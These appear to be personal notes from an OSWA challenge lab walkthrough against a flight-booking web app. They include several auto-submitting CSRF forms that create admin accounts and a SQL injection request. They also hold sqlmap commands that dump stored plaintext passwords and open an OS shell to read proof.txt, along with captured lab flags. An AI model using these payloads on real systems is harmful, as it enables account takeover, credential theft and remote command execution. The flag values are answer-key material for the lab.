#### new IP

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[26Nov2024 13:57:09]-[/home/â€¦/SUT/OSWA/challenge_labs/screamin_firehawk]
â””â”€# ping screamin_firehawk
PING screamin_firehawk (192.168.218.121) 56(84) bytes of data.
64 bytes from screamin_firehawk (192.168.218.121): icmp_seq=1 ttl=61 time=42.2 ms
64 bytes from screamin_firehawk (192.168.218.121): icmp_seq=2 ttl=61 time=42.6 ms
64 bytes from screamin_firehawk (192.168.218.121): icmp_seq=3 ttl=61 time=41.7 ms
^C
--- screamin_firehawk ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 41.662/42.143/42.611/0.387 ms
```

-------
#### registering `test:test` user
![[Pasted image 20241126085858.png]]

`JS` payload to create `bugstwo` user, took out toket functionality - going to place directly into pilot message field
```js
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CSRF PoC</title>
  <script>
    // Automatically submit the form when the page loads
    function submitForm() {
      document.forms['csrf'].submit();
    }
  </script>
</head>
<body onload="submitForm();">
  <!-- Hidden form for CSRF attack -->
  <form 
    action="/loginLogout" 
    method="POST" 
    accept-charset="UTF-8" 
    name="csrf" 
    enctype="multipart/form-data" 
    style="display: none;">
    
    <!-- Hidden input fields -->
    <input type="hidden" name="username" value="bugstwo">
    <input type="hidden" name="password" value="bugstwo">
    <input type="hidden" name="firstName" value="bugstwo">
    <input type="hidden" name="lastName" value="bugstwo">
    <input type="hidden" name="email" value="bugstwo@local.com">
    <input type="hidden" name="dtype" value="isRegister">
    <input type="hidden" name="type" value="100">
  </form>
</body>
</html>
```
trying `raw JS` in the `pilot message` field
![[Pasted image 20241126090046.png]]now waiting until `9:11` to see if account `bugstwo` was created - it is processing
![[Pasted image 20241126090145.png]]what it looks like in burp 
![[Pasted image 20241126090259.png]]
code used from discord help
```js
<html>
  <body>
    <form action="/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="myadmin" />
      <input type="hidden" name="password" value="myadmin" />
      <input type="hidden" name="firstName" value="myadmin" />
      <input type="hidden" name="lastName" value="myadmin" />
      <input type="hidden" name="email" value="myadmin@mail.com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

test with token
```js
<html>
  <body onload="document.forms['hiddenForm'].submit();">
    <form id="hiddenForm" name="hiddenForm" action="/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="m8tXk2sI6K18Qg5l1WNjpFvpOsQBLlgYCvvhZK2O2" />
      <input type="hidden" name="username" value="myadmin" />
      <input type="hidden" name="password" value="myadmin" />
      <input type="hidden" name="firstName" value="myadmin" />
      <input type="hidden" name="lastName" value="myadmin" />
      <input type="hidden" name="email" value="myadmin@mail.com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
without token and with `http://localhost/loginLogout`
```js
<html>
  <body onload="document.forms['csrf'].submit();">
    <form id="hiddenForm" name="hiddenForm" action="http://localhost/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="myadmin" />
      <input type="hidden" name="password" value="myadmin" />
      <input type="hidden" name="firstName" value="myadmin" />
      <input type="hidden" name="lastName" value="myadmin" />
      <input type="hidden" name="email" value="myadmin@mail.com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

without token and with `http://localhost/loginLogout`
```js
<html>
  <body onload="document.forms['csrf'].submit();">
    <form id="hiddenForm" name="hiddenForm" action="http://localhost/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="testing" />
      <input type="hidden" name="password" value="testing" />
      <input type="hidden" name="firstName" value="testing" />
      <input type="hidden" name="lastName" value="testing" />
      <input type="hidden" name="email" value="testing@mail.com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```


burpsuite generate `/loginLogout` not register side
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="iK2qA7bjmhAw11PgakfJUKjyy3EAcjIFDIbrjYgY" />
      <input type="hidden" name="firstName" value="chug" />
      <input type="hidden" name="lastName" value="chug" />
      <input type="hidden" name="departCode" value="JFK" />
      <input type="hidden" name="destinationCode" value="SAN" />
      <input type="hidden" name="passengerCount" value="1" />
      <input type="hidden" name="pilotMessage" value="test" />
      <input type="hidden" name="dType" value="newFlight" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

-------

burpsuite generate `/loginLogout` register side original
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://screamin_firehawk/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="iK2qA7bjmhAw11PgakfJUKjyy3EAcjIFDIbrjYgY" />
      <input type="hidden" name="username" value="test" />
      <input type="hidden" name="password" value="test" />
      <input type="hidden" name="firstName" value="test" />
      <input type="hidden" name="lastName" value="test" />
      <input type="hidden" name="email" value="test&#64;local&#46;com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="50" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


this one worked
localhost modification in context of admin - type changed to `100` to make an admin account - username changed to bugs - had to also make sure that the context of `form action`
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="iK2qA7bjmhAw11PgakfJUKjyy3EAcjIFDIbrjYgY" />
      <input type="hidden" name="username" value="bugs" />
      <input type="hidden" name="password" value="bugs" />
      <input type="hidden" name="firstName" value="bugs" />
      <input type="hidden" name="lastName" value="bugs" />
      <input type="hidden" name="email" value="bugs&#64;local&#46;com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
now wait until 11:00AM the n try to login with `bugs`

was able to login to `bugs` and grab local.txt `c36c2a34d4f0eead7a64786019b5e62a`
![[Pasted image 20241126110919.png]]
what the `burpsuite` looks like
![[Pasted image 20241126112015.png]]
the next step to `proof.txt` tells us the directories to target - `/var/tmp/` & `/backups/`
![[Pasted image 20241126113709.png]]potential sql exploit if can figure out how to modify the `id`
![[Pasted image 20241126113819.png]]


`/editFlight` post request
```http
POST /editFlight HTTP/1.1
Host: screamin_firehawk
Content-Length: 1091
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://screamin_firehawk
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAKOLfA1vBSRnimSp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://screamin_firehawk/administration/editFlight
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=f52027db9919cdf7c4c05f5baa00d064; XSRF-TOKEN=eyJpdiI6ImdUMEp4OFppNUFJbTlJN3VReHhUZUE9PSIsInZhbHVlIjoiUTlKbmtuc2FMVnA0M1YvajJka3g5aFlEQmMrbHFjQzNRcGpGSEs3T2ZhUkl0SHdoQnBlSG4ram0vYWR5ZkgzWTNEQTYxN1FqUXVLSmlPL0VjYkN4UVR5MTZUKys5K0U4YzlobzZ5OTkxdEJKZkF4VE9ZRkoyMy84QW8vK29KNTgiLCJtYWMiOiI5YjY1ZTdjYTNmMDE4MzI2NzE2N2Q1NjdhYzdjZWM1MmNkMmY2M2U1ZGM5MWFmYTNlMzRkMDFjNzk2MDVmZDVkIn0%3D; laravel_session=eyJpdiI6InRBTS9vWCtIK2xXdkJBcTJTbisybnc9PSIsInZhbHVlIjoiRjVUSTZrK3RPK0llMHQzVGVwMDVlWVZUT0FLSDBSV0pEc1p3QnpMdGVpRXZIZWJycjFTWldzWUVKWFZ4VzJhb05xazhHK2RvZ05jdFlhcGlHSDZSMjFGWUdpbkNOZ2xFbnpYTFhIcTEvUExSdklmWlI1dXJ4R2lISEdXZXRESzMiLCJtYWMiOiJjYzVmM2QxOTk4MzhmMGY3N2VlZTY5YTk1MjU0MjgzNThmNTc5ZjgzMTAyNjRmZmJiYzcyZDJhOTAxZGE2MGEzIn0%3D

Connection: keep-alive



------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="_token"



iK2qA7bjmhAw11PgakfJUKjyy3EAcjIFDIbrjYgY

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="firstName"



'

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="lastName"



'

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="departCode"



123

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="destinationCode"



321

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="passengerCount"



1

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="pilotMessage"



select version();

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="username"



test

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="dType"



editFlight

------WebKitFormBoundaryAKOLfA1vBSRnimSp

Content-Disposition: form-data; name="flightNum"



7

------WebKitFormBoundaryAKOLfA1vBSRnimSp--


```

`sqlmap` command to identify the database - kept hitting `Y` to continue
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[26Nov2024 17:05:45]-[/home/â€¦/SUT/OSWA/challenge_labs/screamin_firehawk]
â””â”€# sqlmap -r editFlight-req --banner
[17:04:52] [INFO] the back-end DBMS is PostgreSQL
[17:04:52] [INFO] fetching banner
[17:04:52] [INFO] retrieved: 
```
getting the credentials
```bash
sqlmap -r editFlight-req --technique=S --batch --risk=3 --level=5 --dbms=PostgreSQL -D public -T users -C user_id,lastname,password --dump

Table: users
[4 entries]
+---------+---------------+----------------+
| user_id | lastname      | password       |
+---------+---------------+----------------+
| 1       | firehawkAdmin | hufeh9h123h4@@ |
| 2       | test          | test           |
| 3       | bugs          | bugs           |
| 4       | russo         | russo          |
+---------+---------------+----------------+

```


to get `proof.txt`
```JS
sqlmap -r editFlight-req --batch -v 0 -p passengerCount --os-shell


web server operating system: Linux Debian
web application technology: PHP 7.3.33, Apache 2.4.52
back-end DBMS: PostgreSQL
[17:39:56] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                            
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
os-shell> cat /var/tmp/proof.txt
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: '8ad40806687733daec7242f72558153c'
os-shell> 

```